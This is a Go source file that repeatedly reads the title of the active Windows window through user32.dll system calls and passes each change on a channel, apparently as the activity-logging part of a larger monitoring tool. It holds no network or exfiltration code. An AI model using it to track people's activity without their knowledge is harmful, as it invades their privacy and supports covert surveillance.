package Application

import (
	"syscall"
	"time"
	"unsafe"
)

type Application struct {
	App      string
	DateTime time.Time
}

var (
	procGetForegroundWindow = syscall.NewLazyDLL("user32.dll").NewProc("GetForegroundWindow")
	procGetWindowTextW      = syscall.NewLazyDLL("user32.dll").NewProc("GetWindowTextW")
	CA                      = make(chan Application, 500)
)

func AppLogger(ch chan string, _ch *chan bool) {
	tmp := ""
	var Continue = false
	for {
		select {
		case Continue, _ = <-*_ch:
		default:
			Continue = true
		}
		if !Continue {
			return
		}
		time.Sleep(50 * time.Millisecond)
		g, _ := func() (hand syscall.Handle, err error) {
			r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)
			if e1 != 0 {
				err = error(e1)
				return
			}
			hand = syscall.Handle(r0)
			return
		}()
		b := make([]uint16, 200)
		func(hand syscall.Handle, str *uint16, maxCount int32) (len int32, err error) {
			r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), 3, uintptr(hand), uintptr(unsafe.Pointer(str)), uintptr(maxCount))
			len = int32(r0)
			if len == 0 {
				if e1 != 0 {
					err = error(e1)
				} else {
					err = syscall.EINVAL
				}
			}
			return
		}(g, &b[0], int32(len(b)))

		window := syscall.UTF16ToString(b)
		if window != "" && window != tmp {
			ch <- window
		}
		tmp = window
		time.Sleep(1 * time.Millisecond)
	}
}
